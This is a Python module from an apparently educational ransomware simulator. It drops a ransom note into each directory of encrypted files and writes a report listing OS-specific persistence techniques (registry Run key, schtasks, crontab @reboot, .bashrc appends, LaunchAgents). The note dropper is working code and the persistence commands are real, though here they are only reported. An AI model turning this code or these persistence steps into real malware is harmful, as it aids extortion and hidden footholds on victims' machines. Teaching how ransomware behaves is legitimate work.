"""
modules/ransom_note.py
Drops a README_DECRYPT.txt in every directory that had files encrypted,
and creates a persistence simulation report (no real persistence is applied).
"""
from __future__ import annotations

import json
import platform
import sys
from pathlib import Path
from datetime import datetime, timezone
from typing import List

import config
from utils.logger import get_logger

logger = get_logger(__name__, log_file=config.LOG_FILE)

NOTE_TEMPLATE = """\
╔══════════════════════════════════════════════════════════════╗
║              !! YOUR FILES HAVE BEEN ENCRYPTED !!            ║
║                   [EDUCATIONAL SIMULATOR]                    ║
╚══════════════════════════════════════════════════════════════╝

Campaign ID : {campaign_id}
Timestamp   : {timestamp}
Files locked: {file_count}

YOUR FILES ARE NOT PERMANENTLY LOST.
This is a controlled research simulation.
The decryption key is held in memory by the orchestrator.

─────────────────────────────────────────────────────────────
HOW TO RESTORE (in this simulation):

  python orchestrator.py --decrypt

─────────────────────────────────────────────────────────────
Contact (simulated) : {contact}
DO NOT modify or delete encrypted (.locked) files.
─────────────────────────────────────────────────────────────

[T4816 Ransomware Behavior Learning Project]
"""

# What a real ransomware might attempt for persistence
_PERSISTENCE_TACTICS = {
    "windows": {
        "Run key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "Startup folder": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        "Scheduled task": "schtasks /create /tn T4816 /tr <payload> /sc onlogon",
    },
    "linux": {
        "Crontab": "crontab -e  →  @reboot <payload>",
        "Systemd user service": "~/.config/systemd/user/<name>.service",
        "Bashrc": "echo '<payload>' >> ~/.bashrc",
    },
    "darwin": {
        "LaunchAgent": "~/Library/LaunchAgents/com.t4816.plist",
        "Login item": "System Settings → General → Login Items",
    },
}


class RansomNoteDropper:
    """Drops ransom notes and a persistence-simulation report."""

    def drop_notes(self, encrypted_results: List) -> List[Path]:
        """
        Place README_DECRYPT.txt in each directory that had files encrypted.
        Returns list of note paths created.
        """
        dirs_hit: set[Path] = {
            Path(r.encrypted_path).parent
            for r in encrypted_results
            if r.success
        }
        note_paths: List[Path] = []
        file_count = sum(1 for r in encrypted_results if r.success)

        note_content = NOTE_TEMPLATE.format(
            campaign_id=config.ATTACKER_ID,
            timestamp=datetime.now(timezone.utc).isoformat(),
            file_count=file_count,
            contact=config.RANSOM_CONTACT,
        )

        for directory in sorted(dirs_hit):
            note_path = directory / config.RANSOM_NOTE_NAME
            note_path.write_text(note_content, encoding="utf-8")
            note_paths.append(note_path)
            logger.info("NOTE dropped → %s", note_path)

        return note_paths

    def write_persistence_report(self, sandbox: Path) -> Path:
        """
        Write a JSON report of persistence techniques that WOULD be used
        on the current OS. Nothing is actually applied to the system.
        """
        os_key = "darwin" if sys.platform == "darwin" else (
            "windows" if sys.platform.startswith("win") else "linux"
        )
        tactics = _PERSISTENCE_TACTICS.get(os_key, {})

        report = {
            "simulation": True,
            "note": "No persistence was applied. This report shows what a real sample might do.",
            "detected_os": platform.system(),
            "os_version": platform.version(),
            "applicable_tactics": tactics,
        }

        report_path = sandbox / config.PERSISTENCE_REPORT_NAME
        report_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8"
        )
        logger.info("Persistence simulation report → %s", report_path)
        return report_path
